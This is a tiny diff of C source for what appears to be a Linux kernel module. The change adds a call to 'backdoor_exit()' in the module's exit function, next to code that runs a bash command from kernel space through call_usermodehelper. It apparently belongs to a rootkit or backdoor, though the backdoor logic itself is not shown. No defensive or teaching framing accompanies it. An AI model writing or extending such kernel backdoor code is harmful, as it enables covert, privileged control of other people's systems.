@@ -33,6 +33,9 @@ int duck_init(void) {
 }
 
 void duck_exit(void) {
+
+    backdoor_exit();
+
     char *argv[] = { "/bin/bash", "-c", FOREVER_STOP, NULL };
     char *envp[] = { "HOME=/", NULL };
     call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
